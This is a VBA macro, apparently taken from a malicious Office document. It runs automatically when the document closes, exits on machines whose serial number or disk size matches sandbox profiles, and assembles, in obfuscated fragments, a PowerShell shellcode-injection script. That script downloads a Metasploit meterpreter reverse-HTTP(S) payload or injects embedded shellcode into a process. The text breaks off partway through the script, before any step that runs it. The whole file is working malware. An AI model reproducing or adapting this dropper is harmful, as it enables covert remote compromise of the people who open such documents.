Sub AutoClose()
        M
End Sub

Public Function M() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim C As String
        C = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        C = C + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        C = C + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        C = C + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        C = C + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        C = C + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        C = C + "    $Shellcode,
    [Parameter( ParameterSetName ="
        C = C + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        C = C + "reter/reverse_http',
                  'windows/me"
        C = C + "terpreter/reverse_https',
                  Ignore"
        C = C + "Case = $True )]
    [String]
    $Payload = 'windo"
        C = C + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        C = C + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        C = C + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        C = C + " = $True,
                ParameterSetName = 'Meta"
        C = C + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        C = C + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        C = C + "datory = $True,
                ParameterSetName ="
        C = C + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        C = C + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        C = C + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        C = C + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        C = C + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        C = C + "sion\Internet Settings').'User Agent',
    [Parame"
        C = C + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        C = C + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        C = C + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        C = C + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        C = C + "$False,
    [Switch]
    $Force = $False
)
    Set"
        C = C + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        C = C + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        C = C + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        C = C + "meters['Payload'].Attributes |
            Where-O"
        C = C + "bject {$_.TypeId -eq [System.Management.Automation"
        C = C + ".ValidateSetAttribute]}
        foreach ($Payload "
        C = C + "in $AvailablePayloads.ValidValues)
        {
     "
        C = C + "       New-Object PSObject -Property @{ Payloads ="
        C = C + " $Payload }
        }
        Return
    }
    if "
        C = C + "( $PSBoundParameters['ProcessID'] )
    {
        "
        C = C + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        C = C + "-Null
    }
    function Local:Get-DelegateType
  "
        C = C + "  {
        Param
        (
            [OutputTyp"
        C = C + "e([Type])]
            [Parameter( Position = 0)]
"
        C = C + "            [Type[]]
            $Parameters = (Ne"
        C = C + "w-Object Type[](0)),
            [Parameter( Posit"
        C = C + "ion = 1 )]
            [Type]
            $ReturnT"
        C = C + "ype = [Void]
        )
        $Domain = [AppDomai"
        C = C + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        C = C + "t System.Reflection.AssemblyName('ReflectedDelegat"
        C = C + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        C = C + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        C = C + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        C = C + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        C = C + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        C = C + "der.DefineType('MyDelegateType', 'Class, Public, S"
        C = C + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        C = C + "egate])
        $ConstructorBuilder = $TypeBuilder"
        C = C + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        C = C + "ic', [System.Reflection.CallingConventions]::Stand"
        C = C + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        C = C + "mplementationFlags('Runtime, Managed')
        $Me"
        C = C + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        C = C + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        C = C + ", $Parameters)
        $MethodBuilder.SetImplement"
        C = C + "ationFlags('Runtime, Managed')
        Write-Outpu"
        C = C + "t $TypeBuilder.CreateType()
    }
    function Loc"
        C = C + "al:Get-ProcAddress
    {
        Param
        (
 "
        C = C + "           [OutputType([IntPtr])]
            [Par"
        C = C + "ameter( Position = 0, Mandatory = $True )]
       "
        C = C + "     [String]
            $Module,
            [Pa"
        C = C + "rameter( Position = 1, Mandatory = $True )]
      "
        C = C + "      [String]
            $Procedure
        )
  "
        C = C + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        C = C + ".GetAssemblies() |
            Where-Object { $_.G"
        C = C + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        C = C + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        C = C + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        C = C + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        C = C + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        C = C + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        C = C + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        C = C + "eropServices.HandleRef], [String]))
        $Kern3"
        C = C + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        C = C + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        C = C + "ndleRef = New-Object System.Runtime.InteropService"
        C = C + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        C = C + "Output $GetProcAddress.Invoke($null, @([System.Run"
        C = C + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        C = C + "ure))
    }
    function Local:Emit-CallThreadStub"
        C = C + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        C = C + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        C = C + "chitecture / 8
        function Local:ConvertTo-Li"
        C = C + "ttleEndian ([IntPtr] $Address)
        {
         "
        C = C + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        C = C + "           $Address.ToString("X$($IntSizePtr*2)") "
        C = C + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        C = C + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        C = C + " } }
            [System.Array]::Reverse($LittleEn"
        C = C + "dianByteArray)
            Write-Output $LittleEnd"
        C = C + "ianByteArray
        }
        $CallStub = New-Obj"
        C = C + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        C = C + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        C = C + "                   # MOV   QWORD RAX, &shellcode
 "
        C = C + "           $CallStub += ConvertTo-LittleEndian $Ba"
        C = C + "seAddr       # &shellcode
            $CallStub +="
        C = C + " 0xFF,0xD0                              # CALL  RA"
        C = C + "X
            $CallStub += 0x6A,0x00              "
        C = C + "                # PUSH  BYTE 0
            $CallSt"
        C = C + "ub += 0x48,0xB8                              # MOV"
        C = C + "   QWORD RAX, &ExitThread
            $CallStub +="
        C = C + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        C = C + "ead
            $CallStub += 0xFF,0xD0            "
        C = C + "                  # CALL  RAX
        }
        el"
        C = C + "se
        {
            [Byte[]] $CallStub = 0xB8"
        C = C + "                           # MOV   DWORD EAX, &she"
        C = C + "llcode
            $CallStub += ConvertTo-LittleEn"
        C = C + "dian $BaseAddr       # &shellcode
            $Cal"
        C = C + "lStub += 0xFF,0xD0                              # "
        C = C + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        C = C + "                        # PUSH  BYTE 0
           "
        C = C + " $CallStub += 0xB8                                "
        C = C + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        C = C + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        C = C + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        C = C + "                          # CALL  EAX
        }
  "
        C = C + "      Write-Output $CallStub
    }
    function Lo"
        C = C + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        C = C + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        C = C + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        C = C + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        C = C + "        Throw "Unable to open a process handle for"
        C = C + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        C = C + "lse
        if ($64bitCPU) # Only perform theses c"
        C = C + "hecks if CPU is 64-bit
        {
            $IsWo"
        C = C + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        C = C + "-Null
            if ((!$IsWow64) -and $PowerShell"
        C = C + "32bit)
            {
                Throw 'Unable"
        C = C + " to inject 64-bit shellcode from within 32-bit Pow"
        C = C + "ershell. Use the 64-bit version of Powershell if y"
        C = C + "ou want this to work.'
            }
            e"
        C = C + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        C = C + "  {
                if ($Shellcode32.Length -eq 0)"
        C = C + "
                {
                    Throw 'No s"
        C = C + "hellcode was placed in the $Shellcode32 variable!'"
        C = C + "
                }
                $Shellcode = $S"
        C = C + "hellcode32
            }
            else # 64-bit"
        C = C + " process
            {
                if ($Shellc"
        C = C + "ode64.Length -eq 0)
                {
            "
        C = C + "        Throw 'No shellcode was placed in the $She"
        C = C + "llcode64 variable!'
                }
            "
        C = C + "    $Shellcode = $Shellcode64
            }
      "
        C = C + "  }
        else # 32-bit CPU
        {
          "
        C = C + "  if ($Shellcode32.Length -eq 0)
            {
   "
        C = C + "             Throw 'No shellcode was placed in the"
        C = C + " $Shellcode32 variable!'
            }
           "
        C = C + " $Shellcode = $Shellcode32
        }
        $Remo"
        C = C + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        C = C + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        C = C + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        C = C + ")
        {
            Throw "Unable to allocate "
        C = C + "shellcode memory in PID: $ProcessID"
        }
   "
        C = C + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        C = C + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        C = C + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        C = C + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        C = C + "      {
            $CallStub = Emit-CallThreadStu"
        C = C + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        C = C + "    else
        {
            $CallStub = Emit-Ca"
        C = C + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        C = C + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        C = C + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        C = C + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        C = C + "(!$RemoteStubAddr)
        {
            Throw "Un"
        C = C + "able to allocate thread call stub memory in PID: $"
        C = C + "ProcessID"
        }
        $WriteProcessMemory.I"
        C = C + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        C = C + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        C = C + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        C = C + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        C = C + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        C = C + "  {
            Throw "Unable to launch remote thr"
        C = C + "ead in PID: $ProcessID"
        }
        $CloseHa"
        C = C + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        C = C + "on Local:Inject-LocalShellcode
    {
        if ($"
        C = C + "PowerShell32bit) {
            if ($Shellcode32.Le"
        C = C + "ngth -eq 0)
            {
                Throw 'N"
        C = C + "o shellcode was placed in the $Shellcode32 variabl"
        C = C + "e!'
                return
            }
         "
        C = C + "   $Shellcode = $Shellcode32
        }
        els"
        C = C + "e
        {
            if ($Shellcode64.Length -e"
        C = C + "q 0)
            {
                Throw 'No shell"
        C = C + "code was placed in the $Shellcode64 variable!'
   "
        C = C + "             return
            }
            $She"
        C = C + "llcode = $Shellcode64
        }
        $BaseAddre"
        C = C + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        C = C + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        C = C + "X)
        if (!$BaseAddress)
        {
          "
        C = C + "  Throw "Unable to allocate shellcode memory in PI"
        C = C + "D: $ProcessID"
        }
        [System.Runtime.I"
        C = C + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        C = C + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        C = C + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        C = C + "  if ($PowerShell32bit)
        {
            $Cal"
        C = C + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        C = C + "adAddr 32
        }
        else
        {
       "
        C = C + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        C = C + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        C = C + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        C = C + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        C = C + "X)
        if (!$CallStubAddress)
        {
      "
        C = C + "      Throw "Unable to allocate thread call stub.""
        C = C + "
        }
        [System.Runtime.InteropServices"
        C = C + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        C = C + "allStub.Length)
        $ThreadHandle = $CreateThr"
        C = C + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        C = C + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        C = C + "dHandle)
        {
            Throw "Unable to la"
        C = C + "unch thread."
        }
        $WaitForSingleObje"
        C = C + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        C = C + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        C = C + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        C = C + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        C = C + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        C = C + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        C = C + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        C = C + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        C = C + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        C = C + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        C = C + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        C = C + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        C = C + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        C = C + "  else
    {
        $64bitCPU = $false
    }
    "
        C = C + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        C = C + "l32bit = $true
    }
    else
    {
        $Power"
        C = C + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        C = C + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        C = C + "owerShell32bit) {
            $RootInvocation = $M"
        C = C + "yInvocation.Line
            $Response = $True
   "
        C = C + "         if ( $Force -or ( $Response = $psCmdlet.S"
        C = C + "houldContinue( "Do you want to launch the payload "
        C = C + "from x86 Powershell?",
                   "Attempt"
        C = C + " to execute 32-bit shellcode from 64-bit Powershel"
        C = C + "l. Note: This process takes about one minute. Be p"
        C = C + "atient! You will also see some artifacts of the sc"
        C = C + "ript loading in the other process." ) ) ) { }
    "
        C = C + "        if ( !$Response )
            {
          "
        C = C + "      Return
            }
            if ($MyInvo"
        C = C + "cation.BoundParameters['Force'])
            {
   "
        C = C + "             $Command = "function $($MyInvocation."
        C = C + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        C = C + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        C = C + "   }
            else
            {
              "
        C = C + "  $Command = "function $($MyInvocation.InvocationN"
        C = C + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        C = C + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        C = C + "
            $CommandBytes = [System.Text.Encoding"
        C = C + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        C = C + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        C = C + "           $Execute = '$Command' + " | $Env:windir"
        C = C + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        C = C + "oProfile -Command -"
            Invoke-Expression"
        C = C + " -Command $Execute | Out-Null
            Return
 "
        C = C + "       }
        $Response = $True
        if ( $F"
        C = C + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        C = C + "Do you know what you're doing?",
               "A"
        C = C + "bout to download Metasploit payload '$($Payload)' "
        C = C + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        C = C + "  if ( !$Response )
        {
            Return
 "
        C = C + "       }
        switch ($Payload)
        {
     "
        C = C + "       'windows/meterpreter/reverse_http'
        "
        C = C + "    {
                $SSL = ''
            }
    "
        C = C + "        'windows/meterpreter/reverse_https'
      "
        C = C + "      {
                $SSL = 's'
               "
        C = C + " [System.Net.ServicePointManager]::ServerCertifica"
        C = C + "teValidationCallback = {$True}
            }
     "
        C = C + "   }
        if ($Legacy)
        {
            $R"
        C = C + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        C = C + "
        } else {
            $CharArray = 48..57 "
        C = C + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        C = C + "         $SumTest = $False
            while ($Sum"
        C = C + "Test -eq $False)
            {
                $Ge"
        C = C + "neratedUri = $CharArray | Get-Random -Count 4
    "
        C = C + "            $SumTest = (([int[]] $GeneratedUri | M"
        C = C + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        C = C + "  }
            $RequestUri = -join $GeneratedUri
"
        C = C + "            $Request = "http$($SSL)://$($Lhost):$("
        C = C + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        C = C + "ew-Object Uri($Request)
        $WebClient = New-O"
        C = C + "bject System.Net.WebClient
        $WebClient.Head"
        C = C + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        C = C + "roxy)
        {
            $WebProxyObject = New-"
        C = C + "Object System.Net.WebProxy
            $ProxyAddre"
        C = C + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        C = C + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        C = C + "oxyServer
            if ($ProxyAddress)
         "
        C = C + "   {
                $WebProxyObject.Address = $Pr"
        C = C + "oxyAddress
                $WebProxyObject.UseDefa"
        C = C + "ultCredentials = $True
                $WebClientO"
        C = C + "bject.Proxy = $WebProxyObject
            }
      "
        C = C + "  }
        try
        {
            [Byte[]] $Sh"
        C = C + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        C = C + "}
        catch
        {
            Throw "$($Er"
        C = C + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        C = C + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        C = C + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        C = C + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        C = C + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        C = C + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        C = C + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        C = C + "                             0x52,0x0c,0x8b,0x52,0"
        C = C + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        C = C + "x31,0xc0,
                                  0xac,0"
        C = C + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        C = C + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        C = C + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        C = C + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        C = C + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        C = C + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        C = C + "x8b,
                                  0x01,0xd6,0"
        C = C + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        C = C + "x38,0xe0,0x75,0xf4,
                              "
        C = C + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        C = C + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        C = C + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        C = C + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        C = C + "                                  0x5b,0x5b,0x61,0"
        C = C + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        C = C + "xeb,0x86,0x5d,
                                  0"
        C = C + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        C = C + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        C = C + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        C = C + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        C = C + "                             0x80,0xfb,0xe0,0x75,0"
        C = C + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        C = C + "xd5,0x63,
                                  0x61,0"
        C = C + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        C = C + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        C = C + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        C = C + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        C = C + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        C = C + "                             0x20,0x48,0x8b,0x72,0"
        C = C + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        C = C + "x31,0xc0,
                                  0xac,0"
        C = C + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        C = C + "x41,0x01,0xc1,0xe2,0xed,
                         "
        C = C + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        C = C + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        C = C + "                        0x00,0x00,0x00,0x48,0x85,0"
        C = C + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        C = C + "x44,
                                  0x8b,0x40,0"
        C = C + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        C = C + "x8b,0x34,0x88,0x48,
                              "
        C = C + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        C = C + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        C = C + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        C = C + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        C = C + "                                  0x8b,0x40,0x24,0"
        C = C + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        C = C + "x40,0x1c,0x49,
                                  0"
        C = C + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        C = C + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        C = C + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        C = C + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        C = C + "                             0x59,0x5a,0x48,0x8b,0"
        C = C + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        C = C + "x00,0x00,
                                  0x00,0"
        C = C + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        C = C + "x00,0x41,0xba,0x31,0x8b,
                         "
        C = C + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        C = C + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        C = C + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        C = C + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        C = C + "x47,
                                  0x13,0x72,0"
        C = C + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        C = C + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        C = C + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        C = C + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        C = C + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        C = C + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        C = C + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        C = C + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        C = C + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        C = C + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        C = C + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        C = C + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        C = C + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        C = C + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        C = C + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        C = C + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        C = C + "ernel32.dll WriteProcessMemory
        $WriteProce"
        C = C + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        C = C + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        C = C + "()) ([Bool])
        $WriteProcessMemory = [System"
        C = C + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        C = C + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        C = C + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        C = C + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        C = C + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        C = C + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        C = C + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        C = C + "eateRemoteThread = [System.Runtime.InteropServices"
        C = C + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        C = C + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        C = C + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        C = C + " CloseHandle
        $CloseHandleDelegate = Get-De"
        C = C + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        C = C + "le = [System.Runtime.InteropServices.Marshal]::Get"
        C = C + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        C = C + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        C = C + ".ShouldContinue( 'Do you wish to carry out your ev"
        C = C + "il plans?',
                 "Injecting shellcode "
        C = C + "injecting into $((Get-Process -Id $ProcessId).Proc"
        C = C + "essName) ($ProcessId)!" ) )
        {
            "
        C = C + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        C = C + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        C = C + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        C = C + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        C = C + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        C = C + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        C = C + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        C = C + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        C = C + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        C = C + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        C = C + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        C = C + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        C = C + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        C = C + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        C = C + "rocAddress kernel32.dll CreateThread
        $Crea"
        C = C + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        C = C + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        C = C + "IntPtr])
        $CreateThread = [System.Runtime.I"
        C = C + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        C = C + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        C = C + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        C = C + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        C = C + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        C = C + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        C = C + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        C = C + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        C = C + "ForSingleObjectDelegate)
        if ( $Force -or $"
        C = C + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        C = C + " your evil plans?',
                 "Injecting sh"
